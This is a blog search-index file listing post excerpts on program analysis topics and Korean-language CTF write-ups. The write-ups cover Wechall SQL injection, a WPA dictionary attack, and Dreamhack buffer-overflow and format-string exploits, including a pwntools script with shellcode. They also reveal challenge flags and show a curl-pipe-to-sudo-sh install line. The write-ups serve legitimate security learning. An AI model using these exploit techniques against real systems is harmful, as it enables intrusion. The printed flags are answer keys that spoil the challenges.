var store = [{
        "title": "angr installation",
        "excerpt":"angr is a powerful analysis tool. you can download it by using this command. ‘’’ pip install angr ‘’’ Or just download the docker image. ‘’’ install docker curl -sSL https://get.docker.com/ | sudo sh pull the docker image sudo docker pull angr/angr run it sudo docker run -it angr/angr ‘’’...","categories": ["angr"],
        "tags": [],
        "url": "/angr/first-post/",
        "teaser": null
      },{
        "title": "Intruduction to Program Synthesis",
        "excerpt":"Intruduction to Program Synthesis 개요 많은 기술의 발전에도 불구하고, 아직까지 프로그래머들은 손으로 직접 코드를 작성해야만 한다. 비록 프로그래밍 언어들이 user-friendly하게 발전하였다 하더라도, 프로그래밍하는 방법을 배우는 것은 코딩하는데 있어서 상당한 노력을 기울여야한다. Despite the many advances in computing over the past decades, the actual process of writing computer software has not...","categories": ["Research"],
        "tags": [],
        "url": "/research/Introduction-to-Program-Synthesis/",
        "teaser": null
      },{
        "title": "Fault Localization",
        "excerpt":"Fault Localization: 결함위치식별 Fault Localization (결함위치식별)은 소스코드 내에 존재하는 오류의 위치를 찾아내는 기법으로, spectrum, slice, statistical, machine learning, SMT 등 다양한 방법들이 적용되어 연구되고 있다. Coverage-based Fault Localization coverage 기반의 결함위치식별 기법은 주어진 테스트케이스를 실행하여 결함이 발생하기 까지 실행되는 부분(cover)을 확인하고, 이를 ‘suspiciouness’, ‘의심도’라는 확률 값으로 나타내어 의심도 값이 높은...","categories": ["Research"],
        "tags": [],
        "url": "/research/Fault-Localization/",
        "teaser": null
      },{
        "title": "Lazy Evaluation",
        "excerpt":"Lazy Evaluation: 지연 계산법 (느긋한 계산법) Lazy Evaluation (지연 계산법)은 표현식 (Evaluation)의 계산을 바로 하지 않고 (지연, Lazy), 파일 출력, 화면 출력 등 실제로 표현식에 대한 값이 필요할 때 계산하는 방법이다. Z3, Yice와 같은 SMT solver나 Haskell, Scala와 같은 함수형 언어에서 성능 향상의 목적으로 많이 사용된다. 장점 표현식이 바로 연산되지...","categories": ["Research"],
        "tags": [],
        "url": "/research/Lazy-Evaluation/",
        "teaser": null
      },{
        "title": "Open Source License",
        "excerpt":"오픈소스 라이센스     GPL license   BSD license   MIT license   Reference  [1] http://wiki.kldp.org/wiki.php/OpenSourceLicenseGuide#s-3.2.4  ","categories": ["Programming"],
        "tags": [],
        "url": "/programming/Open-Source-License/",
        "teaser": null
      },{
        "title": "Parameter Optimization",
        "excerpt":"Parameter Optimization   Newton-Raphson method   Quasi-Newton method   Davidon-Fletcher-Powell (DFP) method   // Genetic algorithm, differential evolution  ","categories": ["Research"],
        "tags": [],
        "url": "/research/Parameter-Optimization/",
        "teaser": null
      },{
        "title": "Fault Localization",
        "excerpt":"Formal Semantics Formal Semantics는 프로그램에 대한 계산적 의미(computational meaning)를 모델링한다. 이때의 모델에 대한 묘사는 이미 명확한 의미를 갖는 기호들로 쓰여진 경우 formal하다고 한다. 우리가 잘 알고있는 문법같은 경우에는 프로그램의 구문(syntax)을 보여주고 있다. 구문의 경우에는 단순히 프로그램의 구조만을 보여준다는 점에서 이 프로그램이 어떠한 의미를 목적으로 설계된 프로그램인지 알기 어렵다. 그러나 의미론(semantics)는...","categories": ["Programming"],
        "tags": [],
        "url": "/programming/Formal-Semantics/",
        "teaser": null
      },{
        "title": "(Wechall) MySQL I",
        "excerpt":"(Wechall) MySQL 1 write up 아래 주어진 코드를 통해 쿼리문을 살펴보면 쿼리문에 대해 별다른 처리가 되지 않은 것을 알 수 있다. (prepared statement x) 따라서 사용자 입력 값에 따라 DB를 조회하는 SQL injection 취약점이 존재한다. 위 값을 입력하여 admin 계정으로 시스템에 로그인을 시도했다. admin은 관리자 계정, ‘는 username 값이 끝났음을...","categories": ["Security"],
        "tags": [],
        "url": "/security/(Wechall)-MYSQL1/",
        "teaser": null
      },{
        "title": "(Wechall) MySQL II",
        "excerpt":"(Wechall) MySQL 2 write up 아래 주어진 코드를 살펴보면 MySQL 1과 달리 username에 대해 먼저 데이터를 조회한 뒤, 결과 값에 password 입력을 조회하여 사용자를 인증한다. 이때 password는 md5 암호화 해시 알고리즘에 의해 암호화된다. UNION 키워드를 이용하면 두 개의 쿼리문을 하나로 합칠 수 있다. 다시 말해 테이블을 사용자 마음대로 재구성할 수...","categories": ["Security"],
        "tags": [],
        "url": "/security/(Wechall)-MySQL2/",
        "teaser": null
      },{
        "title": "(Wechall) Regex 1",
        "excerpt":"(Wechall) Training Regex write up Regex 정규표현식 문법을 이용하여 empty string을 매칭하는 정규 표현식 찾기 답 /^$/ 출처: http://www.wechall.net/challenge/training/regex/index.php (Wechall) Training Caesar 2 write up 시저 암호는 고전 암호 알고리즘 중 하나로 Key만큼 문자열을 치환시켜 암호문을 얻는다. (복호화 과정은 그 반대) C = (P + K) % 26 이러한 치환...","categories": ["Security"],
        "tags": [],
        "url": "/security/(Wechall)-Regex/",
        "teaser": null
      },{
        "title": "(Wechall) A Black Hats Tale",
        "excerpt":"문제 풀이 War driving을 통해 은행 본사의 무선 통신을 스니핑하여 통신 데이터 일부를 얻었다 (wpa_psk.cap). 은행은 WPA를 통해 통신을 암호화 하고 있어 스니핑된 데이터는 암호화되어 있다. 따라서 WPA의 키를 알아야 평문을 얻을 수 있다. 문제에서는 dictionary attack을 사용하여 WPA의 패스워드를 알아내라고 힌트를 주었다. 해당 문제를 풀기 위해 aircrack-ng 프로그램을 사용하였으며,...","categories": ["Security"],
        "tags": [],
        "url": "/security/(Wechall)-A-Black-Hats-Tale/",
        "teaser": null
      },{
        "title": "(Pwnable) blukat",
        "excerpt":"문제 풀이 ls -l 명령어를 통해 어떠한 파일이 있고 어떤 코드로 구성되어 있는지 확인하였다. 평소와 같으면 바로 실행 파일을 실행하고, c 파일을 살펴 보았겠지만 자세히 살펴보니 password 파일의 소유 그룹이 눈에 띄었다. id 명령어를 통해 내 계정의 uid와 gid를 확인하였다. 확인 결과 내 계정이 속한 그룹이 password 파일에 접근할 수...","categories": ["Security"],
        "tags": [],
        "url": "/security/(Wechall)-Substitution1/",
        "teaser": null
      },{
        "title": "(Dreamhack) basic_exploitation_000",
        "excerpt":"문제 풀이 buf가 지역 변수로 0x80만큼 할당이 되어 있고, 이를 통해 ret 주소와 132바이트만큼 차이난다는 것을 알 수 있다. (buf크기 128바이트 +sfp 4바이트) IDA를 이용하여 살펴본 스택 공간 from pwn import * proc = remote(\"host1.dreamhack.games\", 15867) proc.recvuntil(\"buf = (\") bufAddr = int(proc.recv(10), 16) shellcode = \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x08\\x40\\x40\\x40\\xcd\\x80\" shellcode += \"\\x80\" *...","categories": ["Security"],
        "tags": [],
        "url": "/security/(DreamHack)-basic_exploitation_000/",
        "teaser": null
      },{
        "title": "(DreamHack) rev-basic-0",
        "excerpt":"풀이   IDA를 통해 주어진 실행 파일을 디스어셈블링하였다. 우전 string view를 확인하여 플래그처럼 보이는 문자열을 확인하였다.      사용자 입력값이 ‘Compar3_the_str1ng’과 일치하는지 비교하는 어셈블리 코드를 확인할 수 있었다.      예상한대로 찾아낸 문자열을 입력하였더니 Correct가 출력되었다.    ","categories": ["Security"],
        "tags": [],
        "url": "/security/(DreamHack)-rev-basic-0/",
        "teaser": null
      },{
        "title": "(DreamHack) rev-basic-1",
        "excerpt":"풀이   IDA를 통해 주어진 실행 파일을 디스어셈블링하고 string view를 확인해 보았다.  플래그로 추정되는 문자열은 찾을 수 없어 비교 연산을 하는 코드가 있는지 찾아보았다. 아래 그림과 같이 문자 하나씩 비교해가며 확인하는 프로세스가 존재하였다.      비교되는 문자들을 아스키코드를 참고하여 변환하면 ‘Compar3_the_ch4ract3r’이라는 문자열을 얻을 수 있다.     ","categories": ["Security"],
        "tags": [],
        "url": "/security/(DreamHack)-rev-basic-1/",
        "teaser": null
      },{
        "title": "(DreamHack) rev-basic-2",
        "excerpt":"풀이 IDA를 통해 주어진 실행 파일을 디스어셈블링하고 string view를 확인해 보았다. 플래그로 추정되는 문자열을 얻을 수 없어 어셈블리 코드를 살펴보았다. 프로세스가 반복되고 있음을 알 수 있지만 아직 어떤 동작을 하는지 정확하게 해석할 수 없었다. 다만 aC의 주소를 옮겨 사용한다는 것은 알 수 있었고, aC의 값이 담긴 스택을 확인해 보았다. ‘Comp4re_the_arr4y’가...","categories": ["Security"],
        "tags": [],
        "url": "/security/(DreamHack)-rev-basic-2/",
        "teaser": null
      },{
        "title": "(DreamHack) Basic_exploitation_002",
        "excerpt":"풀이 Basic_exploitation_002는 FSB (Format String Bug)에 관한 문제이다. FSB는 printf, sprintf 등 서식 문자를 사용하는 함수에서 매개변수를 검증하지 않아 발생하는 보안약점이며, 이를 통해 메모리 내용을 볼 수도 있다. #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; void alarm_handler() { puts(\"TIME OUT\"); exit(-1); } void initialize() { setvbuf(stdin, NULL, _IONBF, 0);...","categories": ["Security"],
        "tags": [],
        "url": "/security/(DreamHack)-basic-exploitation-002/",
        "teaser": null
      },{
        "title": "(DreamHack) Basic_exploitation_003",
        "excerpt":"풀이 이번 문제는 FSB와 BOF가 모두 사용된 문제이다. #include &lt;stdlib.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; void alarm_handler() { puts(\"TIME OUT\"); exit(-1); } void initialize() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); signal(SIGALRM, alarm_handler); alarm(30); } void get_shell() { system(\"/bin/sh\"); } int main(int argc, char *argv[]) { char *heap_buf =...","categories": ["Security"],
        "tags": [],
        "url": "/security/(DreamHack)-basic-exploitation-003/",
        "teaser": null
      }]
